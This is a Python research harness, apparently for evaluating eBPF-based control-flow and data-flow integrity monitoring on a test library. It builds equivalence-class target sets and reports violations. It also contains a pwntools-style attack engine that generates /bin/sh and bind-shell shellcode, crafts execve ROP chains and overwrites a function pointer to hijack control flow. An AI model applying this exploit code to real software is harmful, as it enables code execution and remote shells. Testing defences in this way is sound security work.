        print(f"  间接跳转目标: RAX=0x{event.reg_rax:x}")
        print(f"  CFI预期: 0x{event.cfi_dst_addr:x}")
    elif event.jump_type == 3:
        print(f"  返回地址: 0x{event.ret_addr:x}")

    # ======================================================
    # 等价类缩小展示：Static → CS → Origin
    # ======================================================
    actual_target = event.reg_rax if event.jump_type in (4, 5) else event.ret_addr
    cs_hash = event.call_stack_hash
    ptr_origin = event.ptr_origin

    # 静态等价类大小: 所有函数入口
    func_heads_py = set()
    for entry in cfi_lookup.values():
        if entry['src_func_addr'] != 0:
            func_heads_py.add(entry['src_func_addr'])
    static_ec = len(func_heads_py)

    # CS 等价类: 此 (hash, src) 历史上出现的目标数
    cs_key = (cs_hash, event.src_addr) if (cs_hash != 0 and event.jump_type in (4, 5)) else None
    if cs_key is not None:
        if cs_key not in cs_allowed_targets:
            cs_allowed_targets[cs_key] = set()
        cs_allowed_targets[cs_key].add(actual_target)
        cs_ec = len(cs_allowed_targets[cs_key])
    else:
        cs_ec = 0

    # Origin 等价类: 此 origin 指令历史上出现的目标数
    if ptr_origin != 0:
        if ptr_origin not in origin_allowed_targets:
            origin_allowed_targets[ptr_origin] = set()
        origin_allowed_targets[ptr_origin].add(actual_target)
        origin_ec = len(origin_allowed_targets[ptr_origin])
    else:
        origin_ec = 0

    print(f"\n  🔒 等价类缩小 (EC = Equivalent Class大小):")
    print(f"     ┌ 全地址空间:               ∞ (所有可能的跳转目标)")
    print(f"     ├ 静态EC (func_heads):      {static_ec:>4} (只能是函数入口)")
    print(f"     ├ 调用点敏感EC (CS):        {cs_ec:>4} (此调用栈+此站点 的历史目标)", end="")
    if cs_ec > 0 and cs_ec < static_ec:
        print(f" ✓ 缩小 {static_ec - cs_ec}", end="")
    print()
    print(f"     └ 起源敏感EC (Origin):      {origin_ec:>4} (此指针赋值指令 的历史目标)", end="")
    if origin_ec > 0 and cs_ec > 0 and origin_ec < cs_ec:
        print(f" ✓ 缩小 {cs_ec - origin_ec}", end="")
    elif origin_ec > 0 and origin_ec < static_ec:
        print(f" ✓ 缩小 {static_ec - origin_ec}", end="")
    print()

    # ======================================================
    # enforce/hybrid: 基于 CS/Origin 的额外校验 (缩小等价类)
    # ======================================================
    method = CFI_METHOD_CONFIG.get(event.src_addr, 1) if CFI_MODE == 'hybrid' else \
             (1 if CFI_MODE == 'enforce' else 0)
    method_names = {0: "NONE", 1: "CS", 2: "ORIGIN"}

    if CFI_MODE in ('enforce', 'hybrid'):
        cs_violation = False
        origin_violation = False
        checked = False

        if method in (0, 1) and cs_key is not None:
            cs_set = cs_allowed_targets.get(cs_key, set())
            if len(cs_set) > 0:
                checked = True
                if actual_target not in cs_set:
                    cs_violation = True
                    print(f"     [CS违规] 实际目标 0x{actual_target:x} 不在训练集 (EC={len(cs_set)})")
                else:
                    print(f"     [CS通过] 目标在训练集中 (EC={len(cs_set)})")

        if method in (0, 2) and ptr_origin != 0:
            origin_set = origin_allowed_targets.get(ptr_origin, set())
            if len(origin_set) > 0:
                checked = True
                if actual_target not in origin_set:
                    origin_violation = True
                    print(f"     [Origin违规] 实际目标 0x{actual_target:x} 不在训练集 (EC={len(origin_set)})")
                else:
                    print(f"     [Origin通过] 目标在训练集中 (EC={len(origin_set)})")

        if cs_violation or origin_violation:
            print(f"  [!!!] 等价类违规! 终止进程 (BPF已放行,Python层拦截)")
            os._exit(1)

        if not checked:
            print(f"     ⚠ 无CS/Origin训练数据，先跑 train 模式收集")

    elif CFI_MODE == 'train':
        print(f"     📝 train模式: 已记录到等价类集合")

    print("=" * 80)
    event_count += 1

def handle_df1_layer_event(cpu, data, size):
    global layer_event_count
    event = b["dfi_layer_events"].event(data)
    func_name = event.func_name.decode('utf-8', errors='ignore').split('\x00')[0].strip()

    layer_label = {1: "L1(jump target)", 2: "L2(deref ptr)", 3: "L3(ptr load)"}
    label = layer_label.get(event.layer, f"L{event.layer}")

    if event.reg_value != 0:
        print(f"\n[DFI] {label} site=#{event.site_id} func={func_name}")
        print(f"  offset=0x{event.inst_offset:x}  reg_val=0x{event.reg_value:x}  target=0x{event.target_addr:x}")
    else:
        print(f"\n[DFI] {label} site=#{event.site_id} func={func_name}")
        print(f"  offset=0x{event.inst_offset:x}  (读取失败)")
    layer_event_count += 1

# ======================== 辅助函数 ========================

def get_module_base_from_maps(so_name):
    with open('/proc/self/maps', 'r') as f:
        for line in f:
            if so_name in line:
                start_addr = int(line.split('-')[0], 16)
                return start_addr
    return None

# ======================== pwntools 式 ROP 攻击引擎 ========================

class ROPAttackEngine:
    """使用 pwntools 风格的 ROP 攻击引擎，参考 ripe_attack_test.c"""

    def __init__(self, so_path, base_addr):
        self.so_path = so_path
        self.base = base_addr
        self.elf = ELF(so_path, checksec=False)
        log.info(f"Loaded ELF: {so_path}")
        log.info(f"  Base: 0x{self.base:x}")
        log.info(f"  Arch: {self.elf.arch}  Bits: {self.elf.bits}")

    def find_rop_gadgets(self):
        gadgets = {}
        try:
            rop = ROP(self.elf)
            log.info(f"Found {len(rop.gadgets)} ROP gadgets")

            for addr, gadget in rop.gadgets.items():
                insns_str = ' ; '.join(gadget.insns)
                if len(gadget.insns) <= 4:
                    gadgets[self.base + addr - self.elf.address] = insns_str

            for name in ['pop rdi', 'pop rsi', 'pop rdx', 'ret',
                         'pop rax', 'syscall', 'pop rcx']:
                found = [hex(a) for a, g in gadgets.items() if name in g]
                if found:
                    log.info(f"  {name}: {found[:3]}")
                else:
                    log.warning(f"  {name}: not found")

        except Exception as e:
            log.warning(f"ROP gadget search failed: {e}")

        return gadgets

    def generate_shellcode(self, sc_type='sh'):
        if sc_type == 'sh':
            sc = asm(shellcraft.sh())
        elif sc_type == 'cat_flag':
            sc = asm(shellcraft.cat('flag.txt'))
        elif sc_type == 'bind':
            sc = asm(shellcraft.bindsh(4444, '0.0.0.0'))
        elif sc_type == 'simplenop':
            sc = RIPE_SHELLCODE_SIMPLENOP
        elif sc_type == 'nonop':
            sc = RIPE_SHELLCODE_NONOP
        elif sc_type == 'polynop':
            sc = RIPE_SHELLCODE_POLYNOP
        elif sc_type == 'createfile':
            sc = RIPE_SHELLCODE_CREATEFILE
        elif sc_type == 'returnintolibc':
            sc = b''
        elif sc_type == 'rop':
            sc = b''
        elif sc_type == 'exit0':
            sc = asm('mov rax, 60; mov rdi, 0; syscall')
        else:
            sc = asm(shellcraft.sh())

        log.info(f"Generated shellcode ({sc_type}): {len(sc)} bytes")
        return sc

    def overwrite_indirect_call_ptr(self, lib_handle, new_target):
        libc = ctypes.CDLL("libc.so.6")
        libc.dlsym.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
        libc.dlsym.restype = ctypes.c_void_p
        ptr_addr = libc.dlsym(lib_handle._handle, b'indirect_call_ptr')
        if not ptr_addr:
            log.failure("[ATTACK] dlsym(indirect_call_ptr) failed")
            return False

        original = ctypes.c_uint64.from_address(ptr_addr).value
        log.info(f"[ATTACK] indirect_call_ptr @ 0x{ptr_addr:x}")
        log.info(f"[ATTACK] Original value: 0x{original:x}")

        page_size = 4096
        page_start = ptr_addr & ~(page_size - 1)

        try:
            libc.mprotect.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int]
            libc.mprotect.restype = ctypes.c_int
            result = libc.mprotect(page_start, page_size, 7)
            if result == 0:
                log.success("[ATTACK] mprotect: page made RWX")
                ctypes.c_uint64.from_address(ptr_addr).value = new_target
                new_val = ctypes.c_uint64.from_address(ptr_addr).value
                log.success(f"[ATTACK] Overwrote indirect_call_ptr -> 0x{new_val:x}")
                return True
            else:
                log.failure(f"mprotect failed: errno={ctypes.get_errno()}")
                return False
        except Exception as e:
            log.failure(f"Overwrite failed: {e}")
            return False

    def build_stack_overflow_payload(self, buffer_addr, shellcode, rip_offset,
                                      target_func_addr=None):
        payload = shellcode
        payload += b'A' * (rip_offset - len(payload))
        if target_func_addr:
            payload += p64(target_func_addr)
        else:
            payload += p64(buffer_addr)
        return payload

    def build_indirect_call_exploit(self, lib_handle, shellcode_addr):
        success = self.overwrite_indirect_call_ptr(lib_handle, shellcode_addr)
        return success

    def build_return_into_libc_exploit(self, lib_handle):
        libc = ctypes.CDLL("libc.so.6")
        libc.dlsym.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
        libc.dlsym.restype = ctypes.c_void_p
        func = libc.dlsym(None, b'creat')
        if not func:
            func = libc.dlsym(None, b'system')
        if not func:
            log.failure("[ATTACK] No libc function found for return-into-libc")
            return False
        log.info(f"[ATTACK] return-into-libc target: 0x{func:x}")
        return self.overwrite_indirect_call_ptr(lib_handle, func)

    def build_rop_exploit(self, lib_handle):
        try:
            rop = ROP(self.elf)
            chain = b''
            if rop.rdi and rop.rsi and rop.rax and rop.syscall:
                chain = p64(self.base + rop.rax.address - self.elf.address)
                chain += p64(constants.SYS_execve)
                chain += p64(self.base + rop.rdi.address - self.elf.address)
                bin_sh = next(self.elf.search(b'/bin/sh'), 0)
                bin_sh_addr = self.base + bin_sh - self.elf.address if bin_sh else 0
                chain += p64(bin_sh_addr)
                chain += p64(self.base + rop.rsi.address - self.elf.address)
                chain += p64(0)
                chain += p64(self.base + rop.rdx.address - self.elf.address) if rop.rdx else b''
                chain += p64(0)
                chain += p64(self.base + rop.syscall.address - self.elf.address)
                log.success("Crafted execve ROP chain")

                libc = ctypes.CDLL("libc.so.6")
                page_size = 4096
                mmap_prot = 7
                size = ((len(chain) + page_size - 1) // page_size) * page_size
                libc.mmap.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_long]
                libc.mmap.restype = ctypes.c_void_p
                chain_buf = libc.mmap(None, size, mmap_prot, 0x22, -1, 0)
                if chain_buf and chain_buf != ctypes.c_void_p(-1).value:
                    ctypes.memmove(chain_buf, bytes(chain), len(chain))
                    log.info(f"[ATTACK] ROP chain @ 0x{chain_buf:x}")
                    return self.overwrite_indirect_call_ptr(lib_handle, chain_buf)
                else:
                    log.failure("mmap for ROP chain failed")
                    return False
            else:
                log.warning("Missing gadgets for ROP chain")
                return False
        except Exception as e:
            log.warning(f"ROP exploit failed: {e}")
            return False

    def craft_rop_chain_for_execve(self, bin_sh_addr=0):
        try:
            if bin_sh_addr == 0:
                bin_sh_addr = next(self.elf.search(b'/bin/sh'))
                if bin_sh_addr:
                    log.info(f"Found '/bin/sh' string @ 0x{bin_sh_addr:x}")
                    bin_sh_addr = self.base + bin_sh_addr - self.elf.address
            rop = ROP(self.elf)
            if rop.rdi and rop.rsi and rop.rax and rop.syscall:
                chain = p64(self.base + rop.rax.address - self.elf.address)
                chain += p64(constants.SYS_execve)
                chain += p64(self.base + rop.rdi.address - self.elf.address)
                chain += p64(bin_sh_addr if bin_sh_addr else 0)
                chain += p64(self.base + rop.rsi.address - self.elf.address)
                chain += p64(0)
                chain += p64(self.base + rop.rdx.address - self.elf.address) if rop.rdx else b''
                chain += p64(0)
                chain += p64(self.base + rop.syscall.address - self.elf.address)
                log.success("Crafted execve ROP chain")
                return chain
            else:
                log.warning("Missing gadgets for full execve ROP chain")
                return None
        except Exception as e:
            log.warning(f"ROP chain crafting failed: {e}")
            return None


# ======================== 主程序 ========================

def main():
    global b, event_count, violation_count, base, cfi_lookup, layer_event_count, attack_triggered
    global cs_allowed_targets, cs_training_rounds
    global origin_allowed_targets, ptr_origin_map_py
    global CFI_MODE, CFI_METHOD_CONFIG

    parser = argparse.ArgumentParser(description='CFI/DFI ROP 攻击监控')
    parser.add_argument('-a', '--attack', default='sh',
                        choices=list(ATTACK_TYPES.keys()),
                        help='攻击方式 (default: sh)')
    parser.add_argument('-t', '--target', type=int, default=0, choices=range(6),
                        help='攻击目标站点 0-5 (default: 0)')
    parser.add_argument('-m', '--mode', default='train', choices=['train', 'enforce', 'hybrid'],
                        help='CFI mode: train (收集数据), enforce (强制执行), hybrid (自适应混合)')
    parser.add_argument('--list', action='store_true',
                        help='列出所有攻击方式和目标站点')
    _args = parser.parse_args()

    if _args.list:
        print("\n可用的攻击方式 (-a / --attack):")
        for k, v in ATTACK_TYPES.items():
            print(f"  {k:20s} {v['desc']}")
        print("\n可用的攻击目标站点 (-t / --target):")
        for sid in sorted(TARGET_TRIGGERS):
            info = TARGET_TRIGGERS[sid]
            print(f"  [{sid}] {info['name']:25s} trigger={info['trigger'] or 'N/A':25s} var={info['var'] or 'N/A'}")
        return

    CFI_MODE = _args.mode
    event_count = 0
    layer_event_count = 0
    violation_count = 0
    attack_triggered = False
    cfi_lookup = {}

    cs_allowed_targets = {}
    cs_training_rounds = 0
    origin_allowed_targets = {}
    ptr_origin_map_py = {}
    CFI_METHOD_CONFIG = {}

    script_dir = os.path.dirname(os.path.abspath(__file__))
    so_path = os.path.join(script_dir, "test.so")
    if not os.path.exists(so_path):
        print(f"错误：找不到 {so_path}")
        return

    # ---- Phase 1: 解析三层 DFI 链 ----
    print("\n" + "=" * 60)
    print(f"CFI 模式: {CFI_MODE.upper()}")
    print("=" * 60)
    print("\n[Phase 1] 解析三层 DFI 数据流链")
    print("=" * 60)
    layer_chains, func_bases = parse_df1_layer_chains()
    print(f" 发现 {len(layer_chains)} 个间接跳转站点:")
    for chain in layer_chains:
        save_level = chain.get('save_level')
        save_offset = chain.get('save_offset')
        print(f"  * {chain['func']} @ 0x{chain['jump_addr']:x}  reg={chain['reg']}"
              f"  [save=L{save_level} @ offset=0x{save_offset:x}]" if save_offset else "")
        for layer in chain['layers']:
            itype_names = {0: "DIRECT", 1: "DEREF", 2: "RIP_REL", 3: "RBP_REL", 4: "RET"}
            itname = itype_names.get(layer.get('instr_type', 0), "?")
            mark = " ⭐(SAVE)" if (save_offset is not None and layer['offset'] == save_offset) else ""
            print(f"     L{layer['level']}: 0x{layer['def_addr']:x} type={itname} -> {layer['instr']}{mark}")

    # ---- Phase 2: 解析 CFI 表 ----
    print(f"\n{'='*60}")
    print("[Phase 2] 加载 CFI 规则表")
    print("=" * 60)
    table = parse_cfi_table("test_jump_analysis.csv")
    for entry in table:
        cfi_lookup[entry['src_addr']] = entry

    # ---- Phase 3: 加载 BPF 监控 ----
    print(f"\n{'='*60}")
    print("[Phase 3] 加载 BPF 程序 + 三层DFI保护")
    print("=" * 60)
    b = BPF(text=get_bpf_text())

    lib = ctypes.CDLL(so_path)
    base = get_module_base_from_maps("test.so")
    print(f"[*] test.so 基址: 0x{base:x}")

    b["module_base"][ctypes.c_uint64(0)] = ctypes.c_uint64(base)

    for entry in table:
        offset = ctypes.c_uint64(entry['src_addr'])
        cfi = CfiEntry(**{k: v for k, v in entry.items()
                           if k in [f[0] for f in CfiEntry._fields_]})
        b["cfi_map"][offset] = cfi

    b["jump_events"].open_perf_buffer(handle_jump_event)
    b["dfi_layer_events"].open_perf_buffer(handle_df1_layer_event)

    # Attach Origin Sensitivity probes
    print("\n  挂载起源敏感 (Origin Sensitivity) 指针赋值探针...")
    origin_probes_attached = 0
    for chain in layer_chains:
        if chain['reg'] == 'rsp' and chain['layers'][0]['instr_type'] == 4:
            continue
        sym_name = chain['func'].split('@')[0]
        for layer in chain['layers']:
            if layer['level'] in (2, 3) and layer.get('instr_type') in (1, 2, 3):
                try:
                    b.attach_uprobe(name=so_path, sym=sym_name,
                                    sym_off=layer['offset'], fn_name="trace_ptr_store")
                    origin_probes_attached += 1
                except Exception:
                    pass
    print(f"    共挂载 {origin_probes_attached} 个起源敏感探针")

    # 挂载三层 DFI + CFI uprobes
    print("\n  挂载三层 DFI 数据流保护 + CFI 校验 uprobes...")
    reg_to_idx = REG_TO_IDX
    attached = {}

    for site_id, chain in enumerate(layer_chains):
        if chain['reg'] == 'rsp' and chain['layers'][0]['instr_type'] == 4:
            l1 = chain['layers'][0]
            sym = chain['func'].split('@')[0]
            b.attach_uprobe(name=so_path, sym=sym, sym_off=0, fn_name="trace_ret_target")
            b.attach_uprobe(name=so_path, sym=sym, sym_off=l1['offset'], fn_name="trace_all_jumps")
            continue

        reg_idx = reg_to_idx.get(chain['reg'], 0)
        func = chain['func']
        sym_name = func.split('@')[0]
        save_level = chain.get('save_level', 2)
        save_offset = chain.get('save_offset')

        for layer in chain['layers']:
            level = layer['level']
            def_addr = layer['def_addr']
            sym_off = layer['offset']
            addr_key = (sym_name, sym_off)

            if level == 1:
                fn_name = "trace_df1_l1"
            elif level == 2:
                fn_name = "trace_df1_l2"
            else:
                fn_name = "trace_df1_l3"

            if level != 1 and addr_key in attached:
                existing = attached[addr_key]
                if level == 2 and existing == "trace_df1_l3":
                    pass
                elif level == 3 and existing == "trace_df1_l2":
                    continue
                elif existing in ("trace_df1_l2", "trace_df1_l3"):
                    continue

            meta = DfiLayerMeta()
            meta.site_id = site_id
            meta.reg_sel = reg_idx
            meta.instr_type = layer.get('instr_type', 0)
            meta.extra = layer.get('extra', 0)
            meta.instr_len = layer.get('instr_len', 0)
            meta.need_deref = layer.get('need_deref', 0)
            meta.save_target_to_saved_rax = 1 if (save_offset is not None and sym_off == save_offset) else 0
            fn_bytes = chain['func'].encode('utf-8')[:63]
            meta.func_name = fn_bytes

            cfg_key = ctypes.c_uint64(def_addr)
            if level == 1:
                b["dfi_l1_cfg"][cfg_key] = meta
            elif level == 2:
                b["dfi_l2_cfg"][cfg_key] = meta
            else:
                b["dfi_l3_cfg"][cfg_key] = meta

            try:
                b.attach_uprobe(name=so_path, sym=sym_name, sym_off=sym_off, fn_name=fn_name)
                if level != 1:
                    attached[addr_key] = fn_name
            except Exception as e:
                print(f"     [WARN] uprobe attach failed: {sym_name}+0x{sym_off:x} {fn_name}: {e}")

        try:
            b.attach_uprobe(name=so_path, sym=sym_name, sym_off=chain['layers'][0]['offset'],
                            fn_name="trace_all_jumps")
        except Exception as e:
            print(f"     [WARN] trace_all_jumps attach failed: {sym_name}+0x{chain['layers'][0]['offset']:x}: {e}")

    # ---- Phase 4: pwntools 式 ROP 攻击 ----
    attack_type = _args.attack
    target_id = _args.target
    target_info = TARGET_TRIGGERS.get(target_id, TARGET_TRIGGERS[0])
    sc_type = ATTACK_TYPES[attack_type]['shellcode']

    print(f"\n{'='*60}")
    print(f"[Phase 4] RIPE 攻击 (参考 ripe_attack_runner.c)")
    print(f"  攻击方式: {attack_type} ({ATTACK_TYPES[attack_type]['desc']})")
    print(f"  目标站点: [{target_id}] {target_info['name']}")
    print(f"  触发函数: {target_info['trigger'] or 'N/A'}")
    print(f"  Shellcode类型: {sc_type}")
    print("=" * 60)

    engine = ROPAttackEngine(so_path, base)

    log.info(f"Sections: {[s.name for s in engine.elf.sections[:10]]}...")
    log.info(f"Symbols in .dynsym: indirect_call_ptr={('indirect_call_ptr' in engine.elf.symbols)}")

    gadgets = engine.find_rop_gadgets()

    if not target_info['trigger']:
        print(f"\n[!] 目标站点 {target_id} ({target_info['name']}) 无法直接触发攻击")
        print(f"    该站点为编译器生成的 tm_clones, 不适合攻击")
        return

    shellcode = engine.generate_shellcode(sc_type)

    libc = ctypes.CDLL("libc.so.6")
    libc.mmap.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int,
                           ctypes.c_int, ctypes.c_int, ctypes.c_long]
    libc.mmap.restype = ctypes.c_void_p
    libc.mprotect.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int]
    libc.mprotect.restype = ctypes.c_int
    libc.memmove.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t]
    libc.memmove.restype = ctypes.c_void_p
    libc.munmap.argtypes = [ctypes.c_void_p, ctypes.c_size_t]
    libc.munmap.restype = ctypes.c_int
    libc.getpagesize.argtypes = []
    libc.getpagesize.restype = ctypes.c_int

    page_size = libc.getpagesize()

    MAP_PRIVATE = 2
    MAP_ANONYMOUS = 0x20
    PROT_RW = 3
    PROT_RX = 5

    if shellcode:
        sc_size = ((len(shellcode) + page_size - 1) // page_size) * page_size
        sc_ptr = libc.mmap(None, sc_size, PROT_RW, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)
        if sc_ptr == ctypes.c_void_p(-1).value:
            log.failure(f"mmap for shellcode failed: errno={ctypes.get_errno()}")
            return
        ctypes.memmove(sc_ptr, bytes(shellcode), len(shellcode))
        ret = libc.mprotect(sc_ptr, sc_size, PROT_RX)
        if ret != 0:
            log.warning(f"mprotect PROT_RX failed: errno={ctypes.get_errno()}, trying RWX")
            ret = libc.mprotect(sc_ptr, sc_size, 7)
            if ret != 0:
                log.failure(f"mprotect RWX also failed: errno={ctypes.get_errno()}")
                libc.munmap(sc_ptr, sc_size)
                return
        shellcode_addr = sc_ptr
        print(f"\n[ATTACK] Shellcode @ 0x{shellcode_addr:x} ({len(shellcode)} bytes)")
        print(f"[ATTACK] Hex: {shellcode[:16].hex()}...")
    else:
        shellcode_addr = 0
        print(f"\n[ATTACK] No shellcode needed ({attack_type})")

    print(f"\n[ATTACK] 攻击目标: indirect_call_ptr -> {'shellcode' if shellcode_addr else attack_type}")
    print(f"[ATTACK] 攻击方法: 覆盖全局函数指针 (mprotect + overwrite)")
    print(f"[ATTACK] 触发方式: {target_info['trigger']}()")

    # ---- Phase 4.5: 预训练 (enforce/hybrid 模式需要收集正常运行的 CS/Origin) ----
    if CFI_MODE in ('enforce', 'hybrid'):
        print(f"\n{'='*60}")
        print(f"[Phase 4.5] 预训练: 正常调用 test_all() 收集等价类数据")
        print("=" * 60)
        for i in range(5):
            try:
                lib.test_all()
            except Exception as e:
                print(f"  [!] test_all 第{i+1}轮异常: {e}")
            b.perf_buffer_poll(timeout=10)
        print(f"  预训练完成: CS条目={len(cs_allowed_targets)}, Origin条目={len(origin_allowed_targets)}")

    attack_success = False
    if CFI_MODE == 'train':
        # train 模式只运行正常流程，不攻击
        attack_success = True
    elif attack_type == 'returnintolibc':
        attack_success = engine.build_return_into_libc_exploit(lib)
    elif attack_type == 'rop':
        attack_success = engine.build_rop_exploit(lib)
    else:
        attack_success = engine.build_indirect_call_exploit(lib, shellcode_addr)

    # ---- Phase 5: 触发攻击 + 监控 ----
    print(f"\n{'='*60}")
    print(f"[Phase 5] 触发攻击并监控 CFI 事件")
    print(f"  目标: {target_info['name']}")
    print(f"  触发: {target_info['trigger']}()")
    print(f"  攻击类型: {attack_type}")
    print("=" * 60)

    trigger_func_name = target_info['trigger']
    trigger_func = getattr(lib, trigger_func_name, None)

    if CFI_MODE == 'train':
        def train_loop():
            while True:
                time.sleep(1)
                try:
                    lib.test_all()
                except Exception:
                    pass
        train_thread = threading.Thread(target=train_loop, daemon=True)
        train_thread.start()
    else:
        def trigger_attack():
            time.sleep(2)
            print(f"\n[!] 触发攻击: 调用 {trigger_func_name}() ...")
            print(f"    indirect_call_ptr 已被覆盖为攻击目标地址")
            try:
                if trigger_func:
                    trigger_func()
                else:
                    print(f"[!] {trigger_func_name} 未在 test.so 中找到")
            except Exception as e:
                print(f"[!] {trigger_func_name} 异常 (可能已执行shellcode): {e}")
        attack_thread = threading.Thread(target=trigger_attack, daemon=True)
        attack_thread.start()

    mode_label = {"train": "训练模式 (收集CS/Origin数据)", "enforce": "强制执行模式", "hybrid": "自适应混合模式"}
    print(f"\n=== CFI 监控已启动（{CFI_MODE}: {mode_label.get(CFI_MODE, CFI_MODE)}）===")
    print(f"    攻击方式: {attack_type}   目标站点: {target_info['name']}")
    print("按 Ctrl+C 停止\n")

    try:
        while True:
            b.perf_buffer_poll(timeout=100)
    except KeyboardInterrupt:
        print("\n监控已停止")
    finally:
        print(f"\n{'='*60}")
        print("最终统计")
        print(f"  CFI模式:     {CFI_MODE}")
        print(f"  攻击方式:     {attack_type} ({ATTACK_TYPES[attack_type]['desc']})")
        print(f"  攻击目标:     [{target_id}] {target_info['name']}")
        print(f"  CFI规则数:     {len(table)}")
        print(f"  处理事件数:   {event_count}")
        print(f"  CFI违规数:    {violation_count}")
        print(f"  三层DFI事件数: {layer_event_count}")
        print(f"  攻击检测:     {'检测到攻击!' if attack_triggered else '未检测到异常跳转'}")
        if event_count > 0:
            violation_rate = (violation_count / event_count) * 100
            print(f"  违规率:       {violation_rate:.2f}%")

        # ---- 等价类大小汇总表 ----
        print(f"\n  {'='*60}")
        print(f"  等价类缩小效果汇总 (EC = 合法目标集大小)")
        print(f"  {'─'*60}")
        print(f"  {'防御级别':<20} {'合法目标数':>12} {'缩小比例':>12}")
        print(f"  {'─'*60}")

        # 全地址空间 (2^48 ≈ 理论值)
        print(f"  {'全地址空间':<20} {'2^48 (∞)':>12} {'  baseline':>12}")

        # 静态 func_heads
        func_heads_count = len(set(e['src_func_addr'] for e in cfi_lookup.values() if e['src_func_addr'] != 0))
        print(f"  {'静态EC(func_heads)':<20} {func_heads_count:>12} {'':>12}")

        # CS EC 统计
        if cs_allowed_targets:
            cs_sizes = [len(v) for v in cs_allowed_targets.values()]
            cs_avg = sum(cs_sizes) / len(cs_sizes)
            cs_max = max(cs_sizes)
            cs_min = min(cs_sizes)
            print(f"  {'调用点敏感EC(CS)':<20} {f'avg={cs_avg:.1f} [{cs_min}-{cs_max}]':>12}"
                  f"  {(1 - cs_avg/func_heads_count)*100:>9.0f}% 缩小" if func_heads_count > 0 else "")
        else:
            print(f"  {'调用点敏感EC(CS)':<20} {'(无数据)':>12} {'  先跑train':>12}")

        # Origin EC 统计
        if origin_allowed_targets:
            origin_sizes = [len(v) for v in origin_allowed_targets.values()]
            origin_avg = sum(origin_sizes) / len(origin_sizes)
            origin_max = max(origin_sizes)
            origin_min = min(origin_sizes)
            print(f"  {'起源敏感EC(Origin)':<20} {f'avg={origin_avg:.1f} [{origin_min}-{origin_max}]':>12}"
                  f"  {(1 - origin_avg/func_heads_count)*100:>9.0f}% 缩小" if func_heads_count > 0 else "")
        else:
            print(f"  {'起源敏感EC(Origin)':<20} {'(无数据)':>12} {'  先跑train':>12}")
        print(f"  {'─'*60}")

        # 按站点详细 EC
        if cs_allowed_targets:
            print(f"\n  按调用点 EC 详情 (前10):")
            print(f"  {'CS哈希':>18} {'源偏移':>10} {'EC':>5}  目标列表")
            print(f"  {'─'*18} {'─'*10} {'─'*5}")
            cs_items = sorted(cs_allowed_targets.items(), key=lambda x: len(x[1]), reverse=True)[:10]
            for (rh, so), targets in cs_items:
                tlist = [f"0x{t:x}" for t in list(targets)[:3]]
                print(f"  0x{rh:016x}  0x{so:08x} {len(targets):>5}  {tlist}")

        if origin_allowed_targets:
            print(f"\n  按起源 EC 详情 (前10):")
            print(f"  {'起源偏移':>12} {'EC':>5}  目标列表")
            print(f"  {'─'*12} {'─'*5}")
            origin_items = sorted(origin_allowed_targets.items(), key=lambda x: len(x[1]), reverse=True)[:10]
            for origin, targets in origin_items:
                tlist = [f"0x{t:x}" for t in list(targets)[:3]]
                print(f"  0x{origin:08x} {len(targets):>5}  {tlist}")

        print(f"\n  [RIPE Attack 分析]")
        if attack_success:
            print(f"    indirect_call_ptr 覆盖: 成功")
            print(f"    目标值:                 0x{shellcode_addr:x}")
            print(f"    如果 CFI 未检测到违规 -> 说明攻击绕过了 CFI 检测")
        else:
            print(f"    indirect_call_ptr 覆盖: 失败 (内存保护)")

        if attack_triggered:
            print(f"    [*] CFI成功检测到间接跳转目标劫持")
        else:
            print(f"    [?] 未收到CFI事件 - 检查uprobe是否正确挂载")


if __name__ == "__main__":
    main()
